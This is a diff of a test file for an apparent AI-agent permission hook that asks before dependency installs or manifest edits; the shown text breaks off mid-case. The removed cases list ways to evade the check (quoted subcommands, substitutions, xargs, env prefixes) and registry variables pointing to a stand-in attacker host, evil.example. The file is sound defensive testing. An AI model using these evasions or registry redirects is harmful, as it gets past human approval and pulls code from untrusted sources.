@@ -12,23 +12,27 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-# Exercises .claude/hooks/dependency_guard.py end to end: each case writes a
-# manifest, feeds the hook the PreToolUse payload a real tool call would send,
-# and checks whether it asked. The point of the hook is precision, so the
-# negative cases (routine edits that must stay silent) matter as much as the
-# positive ones.
+# Exercises .claude/hooks/dependency_guard.py end to end. Edit cases write a
+# manifest, feed the hook the PreToolUse payload a real tool call would send,
+# and check whether it asked. The point of the hook is precision, so the
+# negative cases (changes that must stay silent) matter as much as the positive
+# ones.
 
+import hashlib
 import json
+import os
+import re
 import resource
+import shutil
 import subprocess
 import sys
 from pathlib import Path
-from typing import TYPE_CHECKING, NamedTuple, cast
+from typing import TYPE_CHECKING, NamedTuple, Self, cast, final
 
 import pytest
 
 if TYPE_CHECKING:
-    from collections.abc import Mapping
+    from collections.abc import Callable, Mapping
 
 REPO = Path(__file__).resolve().parents[1]
 HOOK = REPO / ".claude" / "hooks" / "dependency_guard.py"
@@ -355,1250 +359,24 @@ CASES = (
 )
 
 
-class BashCase(NamedTuple):
-    label: str
-    command: str
-    ask: bool
-    tool: str = "Bash"
-
-
-VETTED_INSTALLS = [
-    "bun install --frozen-lockfile",
-    "pnpm install --frozen-lockfile",
-    "npm install --no-audit",
-    "bundle install --quiet",
-]
-
-QUOTED_HEREDOC = "echo \"$(cat <<'EOF'\nit's a fix\nEOF\n)\" && "
-
-BASH_CASES: tuple[BashCase, ...] = (
-    BashCase(
-        "append to requirements.txt", "echo 'requests' >> requirements.txt", ask=True
-    ),
-    BashCase(
-        "heredoc into pyproject.toml",
-        "cat > pyproject.toml <<'EOF'\n[project]\nEOF",
-        ask=True,
-    ),
-    BashCase("sed -i on go.mod", "sed -i '' 's/a/b/' go.mod", ask=True),
-    BashCase("tee into Brewfile", "echo 'brew \"jq\"' | tee -a Brewfile", ask=True),
-    BashCase(
-        "python writes go.mod",
-        "python3 -c \"open('go.mod','a').write('x')\"",
-        ask=True,
-    ),
-    # GNU sed spells the in-place flag more ways than BSD sed does.
-    BashCase("sed -i.bak on Cargo.toml", "sed -i.bak 's/a/b/' Cargo.toml", ask=True),
-    BashCase("sed -Ei on pyproject.toml", "sed -Ei 's/a/b/' pyproject.toml", ask=True),
-    BashCase("sed -ni on package.json", "sed -ni 's/a/b/p' package.json", ask=True),
-    BashCase(
-        "sed -i after other flags",
-        "sed -E -n -i 's/a/b/p' pyproject.toml",
-        ask=True,
-    ),
-    BashCase("sed --in-place on go.mod", "sed --in-place 's/a/b/' go.mod", ask=True),
-    BashCase(
-        "sed --in-place with a suffix on go.sum",
-        "sed --in-place=.orig 's/a/b/' go.sum",
-        ask=True,
-    ),
-    BashCase(
-        "sed abbreviates --in-place",
-        "sed --in-pl 's/a/b/' package-lock.json",
-        ask=True,
-    ),
-    BashCase("sed -i after the file", "sed 's/a/b/' go.mod -i", ask=True),
-    BashCase("Homebrew gsed -i on go.mod", "gsed -i 's/a/b/' go.mod", ask=True),
-    BashCase("Homebrew gsed -Ei on Cargo.toml", "gsed -Ei s/a/b/ Cargo.toml", ask=True),
-    BashCase(
-        "sed --in-place after the file", "sed 's/a/b/' go.mod --in-place", ask=True
-    ),
-    BashCase("BSD sed -I on uv.lock", "sed -I '' 's/a/b/' uv.lock", ask=True),
-    BashCase("BSD sed -nI on yarn.lock", "sed -nI '' 's/a/b/p' yarn.lock", ask=True),
-    BashCase(
-        "tee into a module Brewfile",
-        "echo 'brew \"jq\"' | tee brew/dev.Brewfile",
-        ask=True,
-    ),
-    BashCase(
-        "redirect into a module Brewfile",
-        "echo 'brew \"jq\"' > brew/base.Brewfile",
-        ask=True,
-    ),
-    BashCase(
-        "append to a module Brewfile",
-        "echo 'brew \"jq\"' >> brew/cloud.Brewfile",
-        ask=True,
-    ),
-    BashCase(
-        "heredoc into a module Brewfile",
-        "cat > brew/data.Brewfile <<'EOF'\nbrew \"duckdb\"\nEOF",
-        ask=True,
-    ),
-    BashCase(
-        "sed -i on a module Brewfile",
-        "sed -i s/a/b/ brew/macos.Brewfile",
-        ask=True,
-    ),
-    BashCase(
-        "GNU sed -Ei on a module Brewfile",
-        "sed -Ei 's/a/b/' brew/linux.Brewfile",
-        ask=True,
-    ),
-    BashCase("reading a manifest", "cat pyproject.toml", ask=False),
-    BashCase("grepping a manifest", "grep pillow pyproject.toml", ask=False),
-    BashCase("reading a module Brewfile", "cat brew/dev.Brewfile", ask=False),
-    BashCase(
-        "grepping a module Brewfile", "grep -n ripgrep brew/base.Brewfile", ask=False
-    ),
-    BashCase(
-        "sed without in-place on a manifest",
-        "sed -n 's/a/b/p' go.mod",
-        ask=False,
-    ),
-    BashCase(
-        "sed -E without in-place on a manifest",
-        "sed -E 's/a/b/' pyproject.toml",
-        ask=False,
-    ),
-    BashCase(
-        "sed long options without in-place on a manifest",
-        "sed --quiet --expression='s/a/b/p' package.json",
-        ask=False,
-    ),
-    BashCase(
-        "sed -e script on a module Brewfile",
-        "sed -e 's/a/b/' brew/dev.Brewfile",
-        ask=False,
-    ),
-    BashCase("gsed without in-place on a manifest", "gsed -n p go.mod", ask=False),
-    BashCase(
-        "sed in place on an unguarded file", "sed -Ei 's/a/b/' src/app.py", ask=False
-    ),
-    BashCase(
-        "sed in place elsewhere, manifest read in the next command",
-        "sed -i 's/a/b/' notes.txt && cat go.mod",
-        ask=False,
-    ),
-    BashCase("sed over many manifest mentions", "sed go.mod " * 800, ask=False),
-    BashCase("sed with a very long token", "sed -n p " + "a" * 64_000, ask=False),
-    BashCase("sed -i with a very long token", "sed -i p " + "a" * 64_000, ask=False),
-    BashCase("redirect with a very long token", "echo x > " + "a" * 64_000, ask=False),
-    BashCase(
-        "manifest write after a very long token",
-        "sed -i p " + "a" * 64_000 + "\nsed -i s/a/b/ go.mod",
-        ask=True,
-    ),
-    BashCase("unrelated redirect", "make lint > /tmp/out.txt", ask=False),
-    BashCase("ordinary command", "uv run pytest -q", ask=False),
-    # bun install
-    BashCase("bun install without arguments", "bun install", ask=False),
-    BashCase("bun i without arguments", "bun i", ask=False),
-    BashCase(
-        "bun install --frozen-lockfile", "bun install --frozen-lockfile", ask=False
-    ),
-    BashCase(
-        "bun install with several vetted flags",
-        "bun install --frozen-lockfile --production --ignore-scripts -p",
-        ask=False,
-    ),
-    BashCase("bun install --cwd=dir", "bun install --cwd=app", ask=False),
-    BashCase("bun install --omit=dev", "bun install --omit=dev", ask=False),
-    BashCase(
-        "bun by absolute path", "/opt/homebrew/bin/bun install --silent", ask=False
-    ),
-    BashCase(
-        "bun install in a command chain",
-        "cd app && bun install --frozen-lockfile && make test lint",
-        ask=False,
-    ),
-    BashCase(
-        "bun install piped with stderr merged",
-        "bun install --frozen-lockfile 2>&1 | tail -20",
-        ask=False,
-    ),
-    BashCase("bun install with output discarded", "bun install > /dev/null", ask=False),
-    BashCase("bun install with &> redirect", "bun install &>/dev/null", ask=False),
-    BashCase("bun install in the background", "bun install --silent &", ask=False),
-    BashCase(
-        "bun install inside sh -c",
-        "docker run --rm img zsh -c 'bun install --frozen-lockfile && make test'",
-        ask=False,
-    ),
-    BashCase("brew install bun", "brew install bun", ask=False),
-    BashCase("bun run build", "bun run build", ask=False),
-    BashCase("bun test", "bun test src/install.test.ts", ask=False),
-    BashCase("bun install -p repeated", "bun install -p;" * 5_000, ask=False),
-    BashCase("bun install --lockfile-only", "bun install --lockfile-only", ask=False),
-    BashCase(
-        "bun install --lockfile-only with a package",
-        "bun install --lockfile-only left-pad",
-        ask=True,
-    ),
-    BashCase("pnpm install --lockfile-only", "pnpm install --lockfile-only", ask=False),
-    BashCase("npm install --lockfile-only", "npm install --lockfile-only", ask=True),
-    # bun -e runs the next word as code
-    BashCase("bun -e with a quoted script", "bun -e 'console.log 1'", ask=False),
-    BashCase(
-        "bun -e with a script that has separators",
-        """bun -e 'const m = await import("./x.ts"); console.log(m.default)'""",
-        ask=False,
-    ),
-    BashCase(
-        "bun -e with a script over several lines",
-        "bun -e '\nconst n = await Bun.file(\"a.css\").size;\nconsole.log(n);\n'",
-        ask=False,
-    ),
-    BashCase("bun -e in a command chain", "cd app && bun -e 'x 1' | head", ask=False),
-    BashCase("bun -e add reads add as code", "bun -e add left-pad", ask=False),
-    BashCase("bun -p -e reads add as code", "bun -p -e add left-pad", ask=False),
-    BashCase("bun quoted -e", "bun '-e' add left-pad", ask=False),
-    BashCase("bun -p install package", "bun -p install left-pad", ask=True),
-    BashCase("bun -p add", "bun -p add left-pad", ask=True),
-    BashCase("bun --eval add", "bun --eval add left-pad", ask=True),
-    BashCase("bun --print add", "bun --print add left-pad", ask=True),
-    BashCase("bun -be add", "bun -be add left-pad", ask=True),
-    BashCase("bun -e glued to a variable", "bun -e$X add left-pad", ask=True),
-    BashCase("bun -e as a flag's value", "bun --cwd -e add left-pad", ask=True),
-    BashCase("bun add -e", "bun add -e left-pad", ask=True),
-    BashCase("bun install -e", "bun install -e left-pad", ask=True),
-    BashCase("bun -e then another add", "bun -e 'x 1'; bun add left-pad", ask=True),
-    BashCase(
-        "bun -e script that substitutes an add",
-        'bun -e "$(bun add left-pad)"',
-        ask=True,
-    ),
-    BashCase(
-        "bun -e script that names a manager",
-        """bun -e 'console.log("bun " + Bun.version)'""",
-        ask=False,
-    ),
-    BashCase("bun -e fed by xargs", "cat pkgs | xargs bun -e add", ask=False),
-    BashCase("npm -e install", "npm -e install left-pad", ask=True),
-    BashCase("pnpm -e add", "pnpm -e add left-pad", ask=True),
-    BashCase("bun install package", "bun install left-pad", ask=True),
-    BashCase("bun i package", "bun i left-pad", ask=True),
-    BashCase("bun install pinned package", "bun install left-pad@1.3.0", ask=True),
-    BashCase("bun install scoped package", "bun install @types/node", ask=True),
-    BashCase(
-        "bun install package after vetted flags",
-        "bun install --frozen-lockfile left-pad",
-        ask=True,
-    ),
-    BashCase("bun install --dev package", "bun install --dev typescript", ask=True),
-    BashCase("bun install -d package", "bun install -d typescript", ask=True),
-    BashCase("bun install --trust package", "bun install --trust esbuild", ask=True),
-    BashCase("bun install --global", "bun install --global", ask=True),
-    BashCase("bun install -g", "bun install -g", ask=True),
-    BashCase("bun install --analyze", "bun install --analyze src/main.ts", ask=True),
-    BashCase("bun install --force", "bun install --force", ask=True),
-    BashCase(
-        "bun install --registry",
-        "bun install --registry=https://registry.example.com",
-        ask=True,
-    ),
-    BashCase(
-        "bun install --cwd with a separate value", "bun install --cwd app", ask=False
-    ),
-    BashCase(
-        "bun install --cwd with a separate value and a package",
-        "bun install --cwd app left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install --cwd with a variable value",
-        "bun install --cwd $S/app",
-        ask=True,
-    ),
-    BashCase(
-        "bun install --cwd with a flag after it",
-        "bun install --cwd --frozen-lockfile left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install --cwd with a redirect after it",
-        "bun install --cwd > log left-pad",
-        ask=True,
-    ),
-    BashCase("bun install --cwd at the end", "bun install --cwd", ask=True),
-    BashCase("bun install an unknown flag", "bun install --no-such-flag", ask=True),
-    BashCase("bun install a variable", "bun install $PKG", ask=True),
-    BashCase("bun install a quoted package", "bun install 'left-pad'", ask=True),
-    BashCase(
-        "bun install a quoted flag and package",
-        'bun install "--production" "left-pad"',
-        ask=True,
-    ),
-    BashCase(
-        "bun install package by absolute path",
-        "/usr/local/bin/bun install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package after cd", "cd app && bun install left-pad", ask=True
-    ),
-    BashCase(
-        "bun install package after a safe install",
-        "bun install --frozen-lockfile; bun install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package after an env prefix",
-        "env CI=1 bun install left-pad",
-        ask=True,
-    ),
-    BashCase("bun install package under time", "time bun install left-pad", ask=True),
-    BashCase("bun install package in a subshell", "(bun install left-pad)", ask=True),
-    BashCase(
-        "bun install package in a command substitution",
-        "echo $(bun install left-pad)",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package in backticks", "echo `bun install left-pad`", ask=True
-    ),
-    BashCase(
-        "bun install package after a global flag",
-        "bun --cwd=app install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package inside sh -c",
-        "sh -c 'bun install left-pad'",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package behind a quoted subcommand",
-        "bun 'install' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package on a continued line",
-        "bun install \\\n  left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package after a redirect",
-        "bun install > out.txt left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bun install package before a redirect",
-        "bun install left-pad 2>&1 | tail",
-        ask=True,
-    ),
-    BashCase(
-        "bun install a very long argument", "bun install " + "a" * 64_000, ask=True
-    ),
-    BashCase(
-        "bun install a very long digit run", "bun install " + "1" * 64_000, ask=True
-    ),
-    # npm
-    BashCase("npm install without arguments", "npm install", ask=False),
-    BashCase("npm i without arguments", "npm i", ask=False),
-    BashCase(
-        "npm install with vetted flags",
-        "npm install --no-audit --no-fund --ignore-scripts --omit=dev",
-        ask=False,
-    ),
-    BashCase("npm install --prefix=dir", "npm install --prefix=app", ask=False),
-    BashCase("npm install alias", "npm isntall", ask=False),
-    BashCase(
-        "npm install piped with stderr merged",
-        "cd app && npm install --no-audit 2>&1 | tail -5",
-        ask=False,
-    ),
-    BashCase("npm ci", "npm ci", ask=False),
-    BashCase("npm run build", "npm run build", ask=False),
-    BashCase("npm test", "npm test -- --watch=false", ask=False),
-    BashCase("npm install package", "npm install left-pad", ask=True),
-    BashCase("npm i package", "npm i left-pad", ask=True),
-    BashCase("npm i -D package", "npm i -D typescript", ask=True),
-    BashCase("npm install --save-dev package", "npm install --save-dev x", ask=True),
-    BashCase("npm install -g", "npm i -g bun", ask=True),
-    BashCase("npm install a git URL", "npm install git+https://x.test/y.git", ask=True),
-    BashCase("npm install a local path", "npm install ./vendor/x", ask=True),
-    BashCase(
-        "npm install --registry", "npm install --registry=https://x.test", ask=True
-    ),
-    BashCase("npm install package by alias", "npm isntall left-pad", ask=True),
-    BashCase("npm install package by short alias", "npm in left-pad", ask=True),
-    BashCase(
-        "npm install package after vetted flags",
-        "npm install --no-audit left-pad",
-        ask=True,
-    ),
-    BashCase("npm install --omit with a separate value", "npm i --omit dev", ask=False),
-    BashCase(
-        "npm install --prefix with a separate value",
-        "npm install --prefix /tmp/x --no-audit",
-        ask=False,
-    ),
-    BashCase(
-        "npm install --prefix with a separate value and a package",
-        "npm install --prefix /tmp/x left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "npm install --package-lock-only", "npm install --package-lock-only", ask=False
-    ),
-    BashCase("npm install package after cd", "cd app && npm i left-pad", ask=True),
-    # pnpm
-    BashCase("pnpm install without arguments", "pnpm install", ask=False),
-    BashCase("pnpm i without arguments", "pnpm i", ask=False),
-    BashCase(
-        "pnpm install --frozen-lockfile", "pnpm install --frozen-lockfile", ask=False
-    ),
-    BashCase(
-        "pnpm install with several vetted flags",
-        "pnpm install --prod --ignore-scripts --prefer-offline -r",
-        ask=False,
-    ),
-    BashCase("pnpm recursive install", "pnpm -r install", ask=False),
-    BashCase("pnpm filtered install", "pnpm --filter=app install", ask=False),
-    BashCase("pnpm run build", "pnpm run build", ask=False),
-    BashCase("pnpm install package", "pnpm install left-pad", ask=True),
-    BashCase("pnpm i package", "pnpm i left-pad", ask=True),
-    BashCase("pnpm i -D package", "pnpm i -D typescript", ask=True),
-    BashCase("pnpm i -g", "pnpm i -g typescript", ask=True),
-    BashCase("pnpm -r install package", "pnpm -r install left-pad", ask=True),
-    BashCase(
-        "pnpm install --registry", "pnpm install --registry=https://x.test", ask=True
-    ),
-    # bundle
-    BashCase("bundle install without arguments", "bundle install", ask=False),
-    BashCase(
-        "bundle install with vetted flags",
-        "bundle install --frozen --quiet --jobs=4 --without=development",
-        ask=False,
-    ),
-    BashCase("bundle install --deployment", "bundle install --deployment", ask=False),
-    BashCase("bundle exec rspec", "bundle exec rspec spec/", ask=False),
-    BashCase(
-        "bundle install --gemfile", "bundle install --gemfile=x/Gemfile", ask=True
-    ),
-    BashCase(
-        "bundle install --path with a separate value",
-        "bundle install --path vendor/bundle",
-        ask=True,
-    ),
-    BashCase("bundle install an unknown flag", "bundle install --system", ask=True),
-    # brew bundle
-    BashCase("brew bundle", "brew bundle", ask=False),
-    BashCase("brew bundle install", "brew bundle install", ask=False),
-    BashCase(
-        "brew bundle with vetted flags",
-        "brew bundle --force --no-upgrade --upgrade-formulae=a,b",
-        ask=False,
-    ),
-    BashCase(
-        "brew bundle with an expanded flag value",
-        'brew bundle --force --upgrade-formulae="$formulae" | (grep -v x || true)',
-        ask=True,
-    ),
-    BashCase("brew bundle install --verbose", "brew bundle install -v", ask=False),
-    BashCase("brew install a formula", "brew install jq", ask=False),
-    BashCase(
-        "brew bundle add",
-        "brew bundle add --file=brew/dev.Brewfile ripgrep",
-        ask=True,
-    ),
-    BashCase("brew bundle remove", "brew bundle remove ripgrep", ask=True),
-    BashCase("brew bundle dump", "brew bundle dump --force", ask=True),
-    BashCase("brew bundle cleanup", "brew bundle cleanup --force", ask=True),
-    BashCase("brew bundle check", "brew bundle check --verbose", ask=True),
-    BashCase("brew bundle exec", "brew bundle exec -- make", ask=True),
-    BashCase("brew bundle --file", "brew bundle --file=brew/dev.Brewfile", ask=True),
-    BashCase("brew bundle --file=-", "brew bundle --file=-", ask=True),
-    BashCase("brew bundle --global", "brew bundle --global", ask=True),
-    BashCase(
-        "brew bundle after env prefix",
-        "HOMEBREW_NO_AUTO_UPDATE=1 brew bundle cleanup",
-        ask=True,
-    ),
-    # Different tools in one command line are judged separately.
-    BashCase(
-        "safe installs of several tools",
-        " && ".join(VETTED_INSTALLS),
-        ask=False,
-    ),
-    BashCase(
-        "a package install after safe installs of other tools",
-        "bun install && npm install && pnpm i left-pad",
-        ask=True,
-    ),
-    # Substitutions can supply the packages, or split a flag value from them.
-    BashCase("package list from backticks", "bun install `cat pkgs.txt`", ask=True),
-    BashCase(
-        "package list from backticks after a flag",
-        "npm install --no-audit `echo left-pad`",
-        ask=True,
-    ),
-    BashCase("package list from $(...)", "pnpm i $(cat pkgs.txt)", ask=True),
-    BashCase("package list from <(...)", "bun install <(cat pkgs.txt)", ask=True),
-    BashCase(
-        "package after a substituted flag value",
-        'bun install --cwd="$(git rev-parse --show-toplevel)" left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "package after a substituted global flag value",
-        'bun --cwd "$(git rev-parse --show-toplevel)" install left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "package after a quoted separator in a flag value",
-        "bun install --cwd='a;b' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "package after a quoted separator in a global flag value",
-        "bun --cwd 'a;b' install left-pad",
-        ask=True,
-    ),
-    BashCase("flag value from a variable", "bun install --omit=$KINDS", ask=True),
-    BashCase(
-        "package after a clobbering redirect",
-        "bun install >| out.log left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "quoted redirect characters are arguments",
-        "bun install '>' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "clobbering redirect after a vetted flag",
-        "bun install --frozen-lockfile >| out.log",
-        ask=False,
-    ),
-    BashCase(
-        "substitution that is itself an install",
-        "echo $(bun install --frozen-lockfile)",
-        ask=False,
-    ),
-    BashCase("install in a subshell", "(cd app && npm install --no-audit)", ask=False),
-    BashCase(
-        "directory from a substitution before the install",
-        'cd "$(git rev-parse --show-toplevel)" && bun install --frozen-lockfile',
-        ask=False,
-    ),
-    BashCase(
-        "trailing comment",
-        "bun install --frozen-lockfile # restore deps",
-        ask=False,
-    ),
-    BashCase("trailing comment alone", "npm install # it's fine", ask=False),
-    BashCase("# inside a word is not a comment", "npm install left-pad#v1", ask=True),
-    BashCase("install help", "bun install --help", ask=False),
-    # Only the install subcommand is checked.
-    BashCase("bun test filtered by name", "bun test install --bail", ask=False),
-    BashCase("npm run with an install-like script", "npm run install foo", ask=False),
-    BashCase("bundle exec rake install", "bundle exec rake install", ask=False),
-    BashCase("a flag before the subcommand", "pnpm -r install left-pad", ask=True),
-    BashCase(
-        "a flag value before the subcommand", "bun --cwd app i left-pad", ask=True
-    ),
-    # Text that only mentions an install.
-    BashCase("grep for an install", 'grep -rn "bun install" .', ask=False),
-    BashCase(
-        "rg --pre runs its argument", "rg --pre 'npm install left-pad' x .", ask=True
-    ),
-    BashCase("echo of an install", "echo bun install failed", ask=False),
-    BashCase("pipe into grep", "make help | grep 'pnpm install' README.md", ask=False),
-    BashCase("grep, then install", "grep -q x f && npm install left-pad", ask=True),
-    # Monitor runs commands through the same permission path as Bash.
-    BashCase(
-        "package install via Monitor", "bun install left-pad", ask=True, tool="Monitor"
-    ),
-    BashCase(
-        "vetted install via Monitor",
-        "bun install --frozen-lockfile",
-        ask=False,
-        tool="Monitor",
-    ),
-    BashCase(
-        "manifest write via Monitor",
-        "echo '{}' > package.json",
-        ask=True,
-        tool="Monitor",
-    ),
-    # A manager's name that is not the command: an image, an env value, a
-    # redirect target, or another manager's runner.
-    BashCase(
-        "install in an image whose name ends in bun",
-        "docker run --rm -v $PWD:/app -w /app oven/bun bun install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "install after an env value ending in pnpm",
-        "PNPM_HOME=$HOME/Library/pnpm pnpm i left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "install after an env value ending in npm",
-        "npm_config_cache=/tmp/npm npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "install after BUN_INSTALL", "BUN_INSTALL=/opt/bun bun i left-pad", ask=True
-    ),
-    BashCase(
-        "install after a redirect target ending in npm",
-        "2>/tmp/npm npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "install in a container named bun",
-        "docker exec bun npm install left-pad",
-        ask=True,
-    ),
-    BashCase("pnpm exec npm install", "pnpm exec npm install left-pad", ask=True),
-    BashCase("bundle exec npm install", "bundle exec npm install left-pad", ask=True),
-    BashCase(
-        "manager behind a flag value",
-        "docker run -v x:/brew --rm npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "vetted install in an image named bun",
-        "docker run --rm oven/bun bun install --frozen-lockfile",
-        ask=False,
-    ),
-    BashCase(
-        "vetted install after PNPM_HOME",
-        "PNPM_HOME=$HOME/Library/pnpm pnpm install --frozen-lockfile",
-        ask=False,
-    ),
-    BashCase(
-        "vetted install after npm_config_cache",
-        "npm_config_cache=/tmp/npm npm install --no-audit",
-        ask=False,
-    ),
-    BashCase("brew list of managers", "brew list bun npm pnpm", ask=False),
-    BashCase("npm uninstall bun", "npm uninstall bun", ask=False),
-    BashCase("pn alias", "pn i left-pad", ask=True),
-    BashCase("pn alias vetted", "pn install --frozen-lockfile", ask=False),
-    BashCase("bundler alias", "bundler install left-pad", ask=True),
-    BashCase("bundler alias vetted", "bundler install --quiet", ask=False),
-    # An add names a package; a flag before it hides it from the ask rules.
-    BashCase("pnpm --filter add", "pnpm --filter web add zod", ask=True),
-    BashCase("pnpm -C add", "pnpm -C dir add left-pad", ask=True),
-    BashCase("npm -w add", "npm -w app add left-pad", ask=True),
-    BashCase("npm --prefix add", "npm --prefix app add left-pad", ask=True),
-    BashCase("bun --cwd add", "bun --cwd apps/web add zod", ask=True),
-    BashCase("bun add", "bun add left-pad", ask=True),
-    BashCase("bundler add", "bundler add rack", ask=True),
-    BashCase("bundle inject", "bundle inject rack 1.0", ask=True),
-    BashCase("npm install-test", "npm install-test left-pad", ask=True),
-    BashCase("npm it", "npm it left-pad", ask=True),
-    BashCase("pnpm it", "pnpm it left-pad", ask=True),
-    BashCase("pnpm run add script", "pnpm --filter web run add", ask=False),
-    BashCase("bun test with a flag", "bun --cwd app test", ask=False),
-    BashCase("npm run add script", "npm run add", ask=False),
-    # Variables that select a different manifest.
-    BashCase(
-        "HOMEBREW_BUNDLE_FILE",
-        "HOMEBREW_BUNDLE_FILE=/tmp/Brewfile brew bundle",
-        ask=True,
-    ),
-    BashCase(
-        "HOMEBREW_BUNDLE_FILE through env",
-        "env HOMEBREW_BUNDLE_FILE=./Brewfile.new brew bundle install",
-        ask=True,
-    ),
-    BashCase(
-        "HOMEBREW_BUNDLE_FILE exported earlier",
-        "export HOMEBREW_BUNDLE_FILE=/tmp/deps.rb; brew bundle install",
-        ask=True,
-    ),
-    BashCase(
-        "BUNDLE_GEMFILE",
-        "BUNDLE_GEMFILE=gemfiles/x.gemfile bundle install",
-        ask=True,
-    ),
-    BashCase(
-        "unrelated Homebrew variable",
-        "HOMEBREW_NO_AUTO_UPDATE=1 brew bundle",
-        ask=False,
-    ),
-    BashCase(
-        "unrelated Bundler variable",
-        "BUNDLE_DEPLOYMENT=true bundle install",
-        ask=False,
-    ),
-    BashCase(
-        "BUNDLE_GEMFILE without an install",
-        "BUNDLE_GEMFILE=x/Gemfile bundle exec rspec",
-        ask=False,
-    ),
-    BashCase(
-        "HOMEBREW_BUNDLE_FILE_GLOBAL",
-        "HOMEBREW_BUNDLE_FILE_GLOBAL=/tmp/g.rb brew bundle",
-        ask=False,
-    ),
-    # An even run of backslashes before a newline is an escaped backslash.
-    BashCase(
-        "escaped backslash before a newline",
-        "echo hi\\\\\nnpm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "continued line after echo",
-        "echo hi \\\nnpm install left-pad",
-        ask=False,
-    ),
-    BashCase(
-        "comment ending in a backslash",
-        "echo hi # note \\\nnpm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "comment line ending in a backslash",
-        "# note \\\nnpm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "continuation after a quoted hash",
-        'echo "a #"; npm \\\ninstall left-pad',
-        ask=True,
-    ),
-    # Text that mentions an install.
-    BashCase(
-        "comment line before a command",
-        "# Run bun install to refresh the lockfile\nbun test",
-        ask=False,
-    ),
-    BashCase(
-        "comment line before an install",
-        "# refresh\nbun install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "echo inside if/then",
-        'if [ ! -d node_modules ]; then echo "Run npm install first"; fi',
-        ask=False,
-    ),
-    BashCase(
-        "echo inside a loop", 'for d in a b; do echo "npm install x"; done', ask=False
-    ),
-    BashCase(
-        "parenthesis in a trailing comment",
-        "bun install --frozen-lockfile  # installs from bun.lock (no network)",
-        ask=False,
-    ),
-    BashCase("echo with backticks around brew", "echo `brew --prefix`", ask=False),
-    BashCase("install in closing backticks", "echo `bun install`", ask=False),
-    # Redirections and quoted flag values.
-    BashCase(
-        "csh-style redirect", "bun install --frozen-lockfile >& /tmp/out.log", ask=False
-    ),
-    BashCase("csh-style redirect after npm", "npm install >& /tmp/log", ask=False),
-    BashCase(
-        "quoted flag value before the subcommand",
-        'pnpm --filter "@acme/web" install',
-        ask=False,
-    ),
-    BashCase(
-        "quoted flag value before another subcommand",
-        "pnpm --filter '@scope/web' build",
-        ask=False,
-    ),
-    BashCase(
-        "subcommand from a substitution",
-        'npm "$(echo install)" left-pad',
-        ask=True,
-    ),
-    BashCase("subcommand from $(...)", "npm $(echo install) left-pad", ask=True),
-    BashCase("subcommand from a variable", "npm $CMD left-pad", ask=True),
-    # Packages supplied on standard input.
-    BashCase("xargs install", "echo left-pad | xargs npm install", ask=True),
-    BashCase("xargs install from a file", "xargs bun i < pkgs.txt", ask=True),
-    BashCase("xargs install with flags", "xargs -n1 -P4 pnpm install", ask=True),
-    BashCase("xargs by path", "cat p.txt | /usr/bin/xargs bun install", ask=True),
-    BashCase("xargs behind env", "env CI=1 xargs npm i < pkgs.txt", ask=True),
-    BashCase("parallel install", "cat pkgs.txt | parallel npm install", ask=True),
-    BashCase("xargs of something else", "git ls-files | xargs grep foo", ask=False),
-    BashCase(
-        "xargs before a vetted install",
-        "git ls-files | xargs rm -f && npm install --no-audit",
-        ask=False,
-    ),
-    BashCase("xargs only in a comment", "bun install # run in parallel", ask=False),
-    # Variables that move the registry or the configuration.
-    BashCase(
-        "npm_config_registry",
-        "npm_config_registry=https://evil.example npm install",
-        ask=True,
-    ),
-    BashCase(
-        "NPM_CONFIG_USERCONFIG",
-        "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm install",
-        ask=True,
-    ),
-    BashCase(
-        "BUN_CONFIG_REGISTRY",
-        "BUN_CONFIG_REGISTRY=https://evil.example bun install",
-        ask=True,
-    ),
-    BashCase(
-        "pnpm_config_registry",
-        "pnpm_config_registry=https://evil.example pnpm i",
-        ask=True,
-    ),
-    BashCase(
-        "registry variable through env",
-        "env npm_config_registry=https://evil.example npm install",
-        ask=True,
-    ),
-    BashCase(
-        "registry variable exported earlier",
-        "export npm_config_registry=https://evil.example; npm install",
-        ask=True,
-    ),
-    BashCase(
-        "quoted variable name",
-        "npm_con''fig_registry=https://evil.example npm install",
-        ask=True,
-    ),
-    BashCase(
-        "BUNDLE_MIRROR",
-        "BUNDLE_MIRROR__ALL=https://evil.example bundle install",
-        ask=True,
-    ),
-    BashCase(
-        "BUNDLE_APP_CONFIG", "BUNDLE_APP_CONFIG=/tmp/evil bundle install", ask=True
-    ),
-    BashCase(
-        "HOMEBREW_BOTTLE_DOMAIN",
-        "HOMEBREW_BOTTLE_DOMAIN=https://evil.example brew bundle",
-        ask=True,
-    ),
-    BashCase(
-        "registry variable without an install",
-        "npm_config_registry=https://x.test npm run build",
-        ask=False,
-    ),
-    # A separator inside a quoted or escaped word cuts it short.
-    BashCase(
-        "quoted pipe after a vetted flag",
-        "npm install '--no-audit|' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "quoted semicolon after a vetted flag",
-        'npm install "--no-audit;" left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "quoted separator with a space",
-        'bun install "--frozen-lockfile; " left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "quoted hash after a vetted flag",
